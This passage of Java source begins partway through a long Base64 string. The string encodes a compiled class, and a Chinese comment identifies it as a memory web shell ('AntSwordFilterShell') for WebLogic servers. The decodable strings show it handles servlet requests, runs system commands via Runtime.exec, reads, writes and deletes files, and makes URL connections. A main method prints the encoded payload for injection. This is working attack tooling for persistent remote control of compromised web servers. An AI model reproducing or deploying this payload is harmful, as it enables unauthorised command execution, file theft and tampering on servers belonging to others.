QALaXNEaXJlY3RvcnkBAAdnZXROYW1lAQAGbGVuZ3RoAQAcKEopTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEAEShMamF2YS9pby9GaWxlOylWAQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQATKExqYXZhL2lvL1JlYWRlcjspVgEACHJlYWRMaW5lAQAFY2xvc2UBABkoTGphdmEvaW8vT3V0cHV0U3RyZWFtOylWAQATKExqYXZhL2lvL1dyaXRlcjspVgEABXdyaXRlAQAGZGVsZXRlAQAFcmVzZXQBAA9nZXRPdXRwdXRTdHJlYW0BACUoKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRPdXRwdXRTdHJlYW07AQAEKClbQgEAByhbQklJKVYBAARyZWFkAQAHKFtCSUkpSQEADWNyZWF0ZU5ld0ZpbGUBAAZjaGFyQXQBAAQoSSlDAQAHaW5kZXhPZgEABChJKUkBAAQoSSlWAQAGZXhpc3RzAQAFbWtkaXIBAAhyZW5hbWVUbwEAEShMamF2YS9pby9GaWxlOylaAQAFcGFyc2UBACQoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvRGF0ZTsBAAdnZXRUaW1lAQAPc2V0TGFzdE1vZGlmaWVkAQAEKEopWgEADm9wZW5Db25uZWN0aW9uAQAaKClMamF2YS9uZXQvVVJMQ29ubmVjdGlvbjsBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAFKFtCKUkBAApkaXNjb25uZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQALdG9Mb3dlckNhc2UBAApzdGFydHNXaXRoAQAVKExqYXZhL2xhbmcvU3RyaW5nOylaAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldEVycm9yU3RyZWFtAQAMZGVjb2RlQnVmZmVyAQAPcHJpbnRTdGFja1RyYWNlAQAFKFtCKVYBABFqYXZhL2xhbmcvSW50Z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";

    public static String path = "D:\\blog\\code\\weblogicMemShell\\target\\classes\\Shell\\";
    //输出内存马的Base64专码的class文件。
    public static void main(String[] args){
        System.out.println(Base64.getEncoder().encodeToString(getBytesByFile(path+"AntSwordFilterShell.class")));
    }

    public static byte[] getBytesByFile(String pathStr) {
        File file = new File(pathStr);
        try {
            FileInputStream fis = new FileInputStream(file);
            ByteArrayOutputStream bos = new ByteArrayOutputStream(1000);
            byte[] b = new byte[1000];
            int n;
            while ((n = fis.read(b)) != -1) {
                bos.write(b, 0, n);
            }
            fis.close();
            byte[] data = bos.toByteArray();
            bos.close();
            return data;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }
}